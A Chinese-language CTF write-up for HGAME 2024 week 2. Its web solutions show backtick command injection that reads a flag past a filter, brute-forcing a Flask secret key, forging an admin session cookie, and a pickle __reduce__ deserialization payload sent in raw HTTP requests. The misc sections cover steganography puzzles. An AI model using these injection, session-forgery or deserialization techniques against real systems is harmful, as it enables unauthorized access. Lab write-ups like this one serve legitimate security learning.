# HGAME2024_week2_wp


HGAME2024_week2_web&misc

<!--more-->

# Week2

## web

### [What the cow say?]

除了反引号，`$()`也可以

```
`ls /`
```

![image-20240216143935578](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216143935578.png)

直接用cat命令会被waf拦截

```
`tac /fla*/fla*`
```

![image-20240216144348881](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216144348881.png)

### [Select More Courses]

登陆界面，使用top1000字典进行爆破

![image-20240216150542871](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216150542871.png)

根据提示，应该是时间竞争

![image-20240216150649837](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216150649837.png)

```http
POST /api/expand HTTP/1.1
Host: 139.196.183.57:30232
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Referer: http://139.196.183.57:30232/expand
Content-Type: application/json
Content-Length: 23
Origin: http://139.196.183.57:30232
Connection: close
Cookie: session=MTcwODA2NzE4MXxEWDhFQVFMX2dBQUJFQUVRQUFBcV80QUFBUVp6ZEhKcGJtY01DZ0FJZFhObGNtNWhiV1VHYzNSeWFXNW5EQW9BQ0cxaE5XaHlNREJ0fIP0P43CugxLBJt9xdo6NEpISwrwf3-CXDctl9thdqyW

{"username":"ma5hr00m"}
```

payload类型选null并无限重复发包

![image-20240216151634928](C:\Users\scofi\AppData\Roaming\Typora\typora-user-images\image-20240216151634928.png)

再返回自主选课查看

![image-20240216151707602](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216151707602.png)

### [myflask]

```python
import pickle
import base64
from flask import Flask, session, request, send_file
from datetime import datetime
from pytz import timezone

currentDateAndTime = datetime.now(timezone('Asia/Shanghai'))
currentTime = currentDateAndTime.strftime("%H%M%S")

app = Flask(__name__)
# Tips: Try to crack this first ↓
app.config['SECRET_KEY'] = currentTime
print(currentTime)

@app.route('/')
def index():
    session['username'] = 'guest'
    return send_file('app.py')

@app.route('/flag', methods=['GET', 'POST'])
def flag():
    if not session:
        return 'There is no session available in your client :('
    if request.method == 'GET':
        return 'You are {} now'.format(session['username'])
    
    # For POST requests from admin
    if session['username'] == 'admin':
        pickle_data=base64.b64decode(request.form.get('pickle_data'))
        # Tips: Here try to trigger RCE
        userdata=pickle.loads(pickle_data)
        return userdata
    else:
        return 'Access Denied'
 
if __name__=='__main__':
    app.run(debug=True, host="0.0.0.0")

```

[flask中session的那些事]([flask中session的那些事 (ctf.org.cn)](https://ctf.org.cn/2019/11/19/flask中session的那些事/))

[pickle—— Python 物件序列化](https://docs.python.org/zh-tw/dev/library/pickle.html)

**flask-session伪造**

访问/flag

![image-20240216175047386](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216175047386.png)

由以下代码可知，SECRET_KEY为6位数字

```python
currentDateAndTime = datetime.now(timezone('Asia/Shanghai'))
currentTime = currentDateAndTime.strftime("%H%M%S")

app = Flask(__name__)
# Tips: Try to crack this first ↓
app.config['SECRET_KEY'] = currentTime
```

使用crunch生成6位数字字典

```
crunch 6 6 0123456789 -o ~/000000-999999.txt
```

爆破SECRET_KEY

```
flask-unsign  --unsign --cookie "eyJ1c2VybmFtZSI6Imd1ZXN0In0.Zc8itA.-x96nzpnRAmc-tQCxN5uxYLhlQA" --no-literal-eval --wordlist 000000-999999.txt
```

![image-20240216165501808](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216165501808.png)

得到SECRET_KEY为165350并进行session伪造

```
flask-unsign --sign --cookie "{'username': 'admin'}" --secret 165350 --no-literal-eval
```

将cookie写入浏览器，访问`/flag`接口进行验证

![image-20240216165958482](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216165958482.png)

**pickle反序列化rce**

```python
@app.route('/flag', methods=['GET', 'POST'])
def flag():
    ...
    ...
    # For POST requests from admin
    if session['username'] == 'admin':
        pickle_data=base64.b64decode(request.form.get('pickle_data'))
        # Tips: Here try to trigger RCE
        userdata=pickle.loads(pickle_data)
        return userdata
    ...
```

用POST方法请求`/flag`接口，程序使用`pickle.dumps`方法反序列化提交的`pickle_data`参数，并返回反序列化结果

构造`__reduce__`方法进行rce

```python
import pickle
import base64
from urllib.parse import urlencode

class myflaskrce:
	def __reduce__(self):
		return (open, ('/flag', 'r'))
	
payload = base64.b64encode(pickle.dumps(myflaskrce()))
post_params = {'pickle_data': payload}
print(urlencode(post_params))
```

执行脚本，得到payload

```
pickle_data=gANjaW8Kb3BlbgpxAFgFAAAAL2ZsYWdxAVgBAAAAcnEChnEDUnEELg%3D%3D
```

随后发包

```http
POST /flag HTTP/1.1
Host: 139.196.183.57:32139
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: session=eyJ1c2VybmFtZSI6ImFkbWluIn0.Zc8ulQ.hoc3E0E5-vcmVRCr9gVve05SKG4
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

pickle_data=gANjaW8Kb3BlbgpxAFgFAAAAL2ZsYWdxAVgBAAAAcnEChnEDUnEELg%3D%3D
```

![image-20240216174805888](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216174805888.png)

### [search4member]





## misc

### [ek1ng_want_girlfriend]

![image-20240208015452309](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240208015452309.png)

![image-20240208015513833](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240208015513833.png)

![ek1ng](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/ek1ng.jpg)

hgame{ek1ng_want_girlfriend_qq_761042182}

### [ezWord]

将docx文件后缀改为zip并解压

在`\attachment\这是一个word文件\word\media`文件发现提示

![image-20240216175555070](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216175555070.png)

根据`恭喜.txt`推测为双图隐写

![image-20240216175756724](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216175756724.png)

得到解压密码

![image-20240220223103455](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220223103455.png)

`T1hi3sI4sKey`

解压后得到secret.txt文本

![image-20240216175946885](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216175946885.png)

根据文本特征推测为垃圾邮件编码

https://www.spammimic.com/decode.shtml

得到文本

```
籱籰籪籶籮粄簹籴籨粂籸籾籨籼簹籵籿籮籨籪籵簺籨籽籱簼籨籼籮籬类簼籽粆
```

ROT-8000解码

[Chiffre ROT8000 - Déchiffrer, Decoder, Encoder en Ligne (dcode.fr)](https://www.dcode.fr/chiffre-rot8000)

![image-20240216182410764](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240216182410764.png)

### [龙之舞]

音频的频谱分析，发现可疑信息

![image-20240220224207409](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220224207409.png)

![image-20240220224258688](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220224258688.png)

进行反转和镜像

![image-20240220230602050](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220230602050.png)

KEY:5H8w1nlWCX3hQLG

使用deepsound工具

![image-20240220231007803](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220231007803.png)

提取出XXX.zip并解压，得到gif文件，会看到有二维码闪烁

![image-20240220231241931](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220231241931.png)

对gif文件进行逐帧提取

![image-20240220231451147](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220231451147.png)

拼合二维码

![image-20240220232326502](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220232326502.png)

对二维码进行修复

![image-20240220232846437](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220232846437.png)

![image-20240220232903853](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220232903853.png)

![](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220232903853.png)

![image-20240220232921777](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240220232921777.png)

